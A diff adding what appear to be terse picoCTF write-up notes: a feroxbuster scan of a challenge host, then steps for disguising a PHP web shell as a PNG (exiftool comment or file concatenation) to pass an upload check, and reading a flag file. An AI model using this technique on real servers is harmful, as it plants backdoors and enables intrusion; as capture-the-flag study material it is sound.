@@ -1,0 +1,30 @@
+feroxbuster -u 'http://atlas.picoctf.net:52463/'
+
+wrote php shell hexdump -C webshell.png.php
+
+`the first few bytes contain 'PNG' in hexadecimal: "50 4E 47"`
+
+hexdump -C webshell.png.php
+
+cat /var/www/html/GAZWIMLEGU2DQ.txt
+
+note: exiftool
+i.Valid PNG File: Ensure you have a valid PNG file (e.g., image.png).
+ii.PHP Web Shell: Save the PHP web shell code in a file named webshell.php.
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+iii.Use exiftool to Embed PHP Code in PNG File: You can append the PHP code to the PNG file using exiftool. Here’s the command:
+    exiftool -Comment="@webshell.php" image.png
+
+-Comment="@webshell.php": This command adds the content of the webshell.php file to the PNG file's Comment tag in its metadata.
+image.png: This is the PNG file you want to embed the web shell into.
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+iii.Append PHP Code to the PNG File: Use the cat or echo command to append the PHP script to the end of the PNG file. This can be done using the following command:
+
+cat image.png webshell.php > webshell.png.php
+    image.png: The original PNG file.
+    webshell.php: The PHP web shell file.
+    webshell.png.php: The output file that combines the PNG image and the PHP web shell.
+
+-This command concatenates the contents of image.png and webshell.php into a new file called webshell.png.php. The PHP code will be added after the image data, which doesn't affect the validity of the PNG file.
+--------------------------------------------------------------------------------------------------------------------------------------------------------
